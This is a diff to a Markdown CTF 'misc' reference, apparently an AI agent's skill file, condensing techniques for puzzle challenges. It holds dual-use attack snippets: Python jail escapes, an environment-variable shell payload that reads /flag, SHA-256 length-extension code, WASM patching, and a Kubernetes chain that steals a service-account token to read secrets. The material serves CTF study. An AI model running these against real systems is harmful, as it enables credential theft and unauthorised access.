@@ -7,15 +7,16 @@ allowed-tools: ["Bash", "Read", "Write", "Edit", "Glob", "Grep", "Task", "WebFet
 
 # CTF Miscellaneous
 
-Quick reference for misc challenges. For detailed techniques, see supporting files.
+Quick reference for miscellaneous CTF challenges. Each technique has a one-liner here; see supporting files for full details.
 
 ## Additional Resources
 
 - [pyjails.md](pyjails.md) - Python jail/sandbox escape techniques
 - [bashjails.md](bashjails.md) - Bash jail/restricted shell escape techniques
-- [encodings.md](encodings.md) - Encodings, QR codes, audio, esolangs
+- [encodings.md](encodings.md) - Encodings, QR codes, audio, esolangs, SHA-256 length extension, UTF-16 tricks
 - [rf-sdr.md](rf-sdr.md) - RF/SDR/IQ signal processing (QAM-16, carrier recovery, timing sync)
-- [dns.md](dns.md) - DNS exploitation (ECS spoofing, NSEC walking, IXFR)
+- [dns.md](dns.md) - DNS exploitation (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling)
+- [games-and-vms.md](games-and-vms.md) - WASM patching, PyInstaller, marshal, Python env RCE, Z3, K8s RBAC
 
 ---
 
@@ -47,41 +48,32 @@ echo "uryyb" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
 - Base32: `A-Z2-7=` (no lowercase)
 - Hex: `0-9a-fA-F`
 
+See [encodings.md](encodings.md) for Caesar brute force, URL encoding, and full details.
+
 ## IEEE-754 Float Encoding (Data Hiding)
 
 **Pattern (Floating):** Numbers are float32 values hiding raw bytes.
 
-**Key insight:** A 32-bit float is just 4 bytes interpreted as a number. Reinterpret as raw bytes → ASCII.
+**Key insight:** A 32-bit float is just 4 bytes interpreted as a number. Reinterpret as raw bytes -> ASCII.
 
 ```python
 import struct
-
-# List of suspicious floating-point numbers
 floats = [1.234e5, -3.456e-7, ...]  # Whatever the challenge gives
-
-# Convert each float to 4 raw bytes (big-endian)
 flag = b''
 for f in floats:
     flag += struct.pack('>f', f)
 print(flag.decode())
 ```
 
-**CyberChef solution:**
-1. Paste numbers (space-separated)
-2. "From Float" → Big Endian → Float (4 bytes) → Space delimiter
-
-**Variations:**
-- Double (8 bytes): `struct.pack('>d', val)`
-- Little-endian: `struct.pack('<f', val)`
-- Mixed endianness: try both if first doesn't produce ASCII
+**Variations:** Double `'>d'`, little-endian `'<f'`, mixed. See [encodings.md](encodings.md) for CyberChef recipe.
 
 ## USB Mouse PCAP Reconstruction
 
 **Pattern (Hunt and Peck):** USB HID mouse traffic captures on-screen keyboard typing.
 
 **Workflow:**
-1. Open PCAP in Wireshark — identify USBPcap with HID interrupt transfers
-2. Identify device (Device Descriptor → manufacturer/product)
+1. Open PCAP in Wireshark -- identify USBPcap with HID interrupt transfers
+2. Identify device (Device Descriptor -> manufacturer/product)
 3. Use USB-Mouse-Pcap-Visualizer: `github.com/WangYihang/USB-Mouse-Pcap-Visualizer`
 4. Extract click coordinates (falling edges of `left_button_holding`)
 5. Plot clicks on scatter plot with matplotlib
@@ -139,6 +131,8 @@ zbarimg qrcode.png       # Decode
 qrencode -o out.png "data"
 ```
 
+See [encodings.md](encodings.md) for QR structure, repair techniques, and chunk reassembly.
+
 ## Audio Challenges
 
 ```bash
@@ -192,7 +186,7 @@ for i in range(flag_len):
 (abcdef := "new_allowed_chars")
 
 # Octal escapes
-'\\141' = 'a'
+'\141' = 'a'
 ```
 
 **Decorator bypass (ast.Call banned, no quotes, no `=`):**
@@ -207,6 +201,8 @@ def os():
 # Result: os = __import__("os")
 ```
 
+**String join bypass (`+` blocked):** `open(''.join(['fl','ag.txt'])).read()` -- see [pyjails.md](pyjails.md) for more.
+
 ## Z3 Constraint Solving
 
 ```python
@@ -220,6 +216,8 @@ if s.check() == sat:
     print(bytes([s.model()[f].as_long() for f in flag]))
 ```
 
+See [games-and-vms.md](games-and-vms.md) for YARA rules with Z3 and type systems as constraints.
+
 ## Hash Identification
 
 **By constants:**
@@ -227,12 +225,27 @@ if s.check() == sat:
 - SHA-256: `0x6a09e667`
 - MurmurHash64A: `0xC6A4A7935BD1E995`
 
+## SHA-256 Length Extension Attack
+
+**Pattern:** MAC = `SHA-256(SECRET || message)` with known message and hash. Forge valid MAC without knowing SECRET.
+
+```python
+import hlextend
+sha = hlextend.new('sha256')
+new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
+new_hash = sha.hexdigest()
+```
+
+Vulnerable: SHA-256, MD5, SHA-1. NOT vulnerable: HMAC, SHA-3. See [encodings.md](encodings.md) for full attack steps.
+
 ## PyInstaller Extraction
 
 ```bash
 python pyinstxtractor.py packed.exe
 # Look in packed.exe_extracted/
 ```
+
+See [games-and-vms.md](games-and-vms.md) for opcode remapping and marshal analysis.
 
 ## Marshal Code Analysis
 
@@ -249,6 +262,20 @@ dis.dis(code)
 PYTHONWARNINGS=ignore::antigravity.Foo::0
 BROWSER="/bin/sh -c 'cat /flag' %s"
 ```
+
+See [games-and-vms.md](games-and-vms.md) for other dangerous env vars and full explanation.
+
+## WASM Game Exploitation via Patching
+
+**Pattern:** Game with unbeatable AI in WASM. Patch minimax to play badly, proofs still validate.
+
+```bash
+wasm2wat main.wasm -o main.wat
+# Flip bestScore init and comparison operator
+wat2wasm main.wat -o main_patched.wasm
+```
+
+See [games-and-vms.md](games-and-vms.md) for full exploitation code and JS integration.
 
 ## Floating-Point Precision Exploitation
 
@@ -269,10 +296,10 @@ for i in range(1, 100):
         print(f'x={x}: {result} (fraction={frac})')
 
 # Common values with positive fractions:
-# 0.07 → 70000000000000.0078125
-# 0.14 → 140000000000000.015625
-# 0.27 → 270000000000000.03125
-# 0.56 → 560000000000000.0625
+# 0.07 -> 70000000000000.0078125
+# 0.14 -> 140000000000000.015625
+# 0.27 -> 270000000000000.03125
+# 0.56 -> 560000000000000.0625
 ```
 
 ### Exploitation Strategy
@@ -291,14 +318,14 @@ inventory = 0.56 * 1e15 = 560000000000000.0625
 
 # Sell exactly 560000000000000 (integer part):
 balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
-inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee ✓
+inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee
 
-# Now: balance >= flag_price ✓ AND inventory >= fee ✓
+# Now: balance >= flag_price AND inventory >= fee
 ```
 
 ### Why It Works
 - Float64 has ~15-16 significant digits precision
-- `(5.0 - 0.56) * 1e15` loses precision → rounds to exact 5e15 when added
+- `(5.0 - 0.56) * 1e15` loses precision -> rounds to exact 5e15 when added
 - `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
 - The asymmetric rounding gives you slightly more total value than you started with
 
@@ -335,106 +362,11 @@ def find_exploit(mult, balance_needed, inventory_needed):
 find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
 ```
 
-## WASM Game Exploitation via Patching (Pragyan 2026)
-
-**Pattern (Tac Tic Toe):** Game with unbeatable AI in WebAssembly. Proof/verification system validates moves but doesn't check optimality.
-
-**Key insight:** If the proof generation depends only on move positions and seed (not on whether moves were optimal), patching the WASM to make the AI play badly produces a beatable game with valid proofs.
-
-**Patching workflow:**
-```bash
-# 1. Convert WASM binary to text format
-wasm2wat main.wasm -o main.wat
-
-# 2. Find the minimax function (look for bestScore initialization)
-# Change initial bestScore from -1000 to 1000
-# Flip comparison: i64.lt_s → i64.gt_s (selects worst moves instead of best)
-
-# 3. Recompile
-wat2wasm main.wat -o main_patched.wasm
-```
-
-**Exploitation:**
-```javascript
-const go = new Go();
-const result = await WebAssembly.instantiate(
-  fs.readFileSync("main_patched.wasm"), go.importObject
-);
-go.run(result.instance);
-
-InitGame(proof_seed);
-// Play winning moves against weakened AI
-for (const m of [0, 3, 6]) {
-    PlayerMove(m);
-}
-const data = GetWinData();
-// Submit data.moves and data.proof to server → valid!
-```
-
-**General lesson:** In client-side game challenges, always check if the verification/proof system is independent of move quality. If so, patch the game logic rather than trying to beat it.
-
-## SHA-256 Length Extension Attack (LACTF 2026)
-
-**Pattern (ttyspin):** MAC = `SHA-256(SECRET || message)` with known message and hash. Forge valid MAC for `SECRET || message || padding || extension`.
-
-**Key insight:** SHA-256 (and MD5, SHA-1) are Merkle-Damgård constructions. Knowing `H(SECRET || msg)` lets you compute `H(SECRET || msg || glue_pad || ext)` without knowing SECRET.
-
-**Attack steps:**
-1. Compute glue padding: the padding SHA-256 would apply after `SECRET || msg`
-2. Construct new message: `msg || glue_pad || malicious_extension`
-3. Resume SHA-256 from the known hash state, feed extension bytes
-4. Result is valid MAC for the new message
-
-```bash
-# Using hashpumpy or hlextend:
-pip install hlextend
-```
-```python
-import hlextend
-sha = hlextend.new('sha256')
-new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
-new_hash = sha.hexdigest()
-# new_data includes original + glue padding + extension
-```
-
-**Common in CTFs:** Game save files, session tokens, API signatures using `H(secret || data)`. Always check if the MAC construction is vulnerable to length extension (SHA-256, MD5, SHA-1 are; HMAC, SHA-3 are NOT).
-
-## UTF-16 Endianness Reversal (LACTF 2026)
-
-**Pattern (endians):** Text "turned to Japanese" — mojibake from UTF-16 endianness mismatch.
-
-**Fix:** Reverse the encoding/decoding order:
-```python
-# If encoded as UTF-16-LE but decoded as UTF-16-BE:
-fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
-
-# If encoded as UTF-16-BE but decoded as UTF-16-LE:
-fixed = mojibake.encode('utf-16-le').decode('utf-16-be')
-```
-
-**Identification:** Text appears as CJK characters (Japanese/Chinese), challenge mentions "translation" or "endian".
-
-## QR Code Chunk Reassembly (LACTF 2026)
-
-**Pattern (error-correction):** QR code split into grid of chunks (e.g., 5x5 of 9x9 pixels), shuffled.
-
-**Solving approach:**
-1. **Fix known chunks:** Use structural patterns — finder patterns (3 corners), timing patterns, alignment patterns — to place ~50% of chunks
-2. **Extract codeword constraints:** For each candidate payload length, use QR spec to identify which pixels are invariant across encodings
-3. **Backtracking search:** Assign remaining chunks under pixel constraints until QR decodes successfully
-
-**Tools:** `segno` (Python QR library), `zbarimg` for decoding.
-
-## Kubernetes RBAC Bypass (LACTF 2026)
+## Kubernetes RBAC Bypass
 
 **Pattern (CTFaaS):** Container deployer with claimed ServiceAccount isolation.
 
-**Attack chain:**
-1. Deploy probe container that reads in-pod ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
-2. Verify token can impersonate deployer SA (common misconfiguration)
-3. Create pod with `hostPath` volume mounting `/` → read node filesystem
-4. Extract kubeconfig (e.g., `/etc/rancher/k3s/k3s.yaml`)
-5. Use node credentials to access hidden namespaces and read secrets
+**Attack chain:** Deploy probe -> read SA token -> impersonate deployer -> hostPath mount -> extract kubeconfig -> read secrets.
 
 ```bash
 # From inside pod:
@@ -442,6 +374,8 @@ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 curl -k -H "Authorization: Bearer $TOKEN" \
   https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
 ```
+
+See [games-and-vms.md](games-and-vms.md) for full attack chain and K8s privilege escalation checklist.
 
 ## 3D Printer Video Nozzle Tracking (LACTF 2026)
 
@@ -453,7 +387,7 @@ curl -k -H "Authorization: Bearer $TOKEN" \
 # 2. Track print head X position (physical X-axis)
 # 3. Track bed X position (physical Y-axis from camera angle)
 # 4. Filter for moves with extrusion (head moving while printing)
-# 5. Plot as 2D scatter/histogram → letters appear
+# 5. Plot as 2D scatter/histogram -> letters appear
 ```
 
 ## Useful One-Liners
@@ -494,41 +428,25 @@ print(flag)
 
 **CyberChef:** "From Decimal" recipe with line feed delimiter.
 
-## Python Jail: String Join Bypass
-
-**Pattern (better_eval):** `+` operator blocked for string concatenation.
-
-**Bypass with `''.join()`:**
-```python
-# Blocked: "fl" + "ag.txt"
-# Allowed: ''.join(["fl","ag.txt"])
-
-# Full payload:
-open(''.join(['fl','ag.txt'])).read()
-```
-
-**Other bypass techniques:**
-- `chr()` + list comprehension: `''.join([chr(102),chr(108),chr(97),chr(103)])`
-- Format strings: `f"{'flag'}.txt"` (if f-strings allowed)
-- `bytes([102,108,97,103]).decode()` for "flag"
-
 ## Backdoor Detection in Source Code
 
 **Pattern (Rear Hatch):** Hidden command prefix triggers `system()` call.
 
 **Common patterns:**
-- `strncmp(input, "exec:", 5)` → runs `system(input + 5)`
+- `strncmp(input, "exec:", 5)` -> runs `system(input + 5)`
 - Hex-encoded comparison strings: `\x65\x78\x65\x63\x3a` = "exec:"
 - Hidden conditions in maintenance/admin functions
 
 ## DNS Exploitation Techniques
 
-See [dns.md](dns.md) for full details (ECS spoofing, NSEC walking, IXFR).
+See [dns.md](dns.md) for full details (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling).
 
 **Quick reference:**
 - **ECS spoofing**: `dig @server flag.example.com TXT +subnet=10.13.37.1/24` - try leet-speak IPs (1337)
 - **NSEC walking**: Follow NSEC chain to enumerate DNSSEC zones
 - **IXFR**: `dig @server domain IXFR=0` when AXFR is blocked
+- **DNS rebinding**: Low-TTL alternating resolution to bypass same-origin
+- **DNS tunneling**: Data exfiltrated via subdomain queries or TXT responses
 
 ## Unicode Steganography
 
@@ -553,7 +471,18 @@ for c in hidden_chars:
     flag += chr(val)
 ```
 
-**Detection:** Characters appear invisible but have non-zero length. Check with `[hex(ord(c)) for c in text]` — look for codepoints in `0xE0100-0xE01EF` or `0xFE00-0xFE0F` range.
+**Detection:** Characters appear invisible but have non-zero length. Check with `[hex(ord(c)) for c in text]` -- look for codepoints in `0xE0100-0xE01EF` or `0xFE00-0xFE0F` range.
+
+## UTF-16 Endianness Reversal
+
+**Pattern (endians):** Text "turned to Japanese" -- mojibake from UTF-16 endianness mismatch.
+
+```python
+# If encoded as UTF-16-LE but decoded as UTF-16-BE:
+fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
+```
+
+**Identification:** CJK characters, challenge mentions "translation" or "endian". See [encodings.md](encodings.md) for details.
 
 ## Cipher Identification Workflow
 
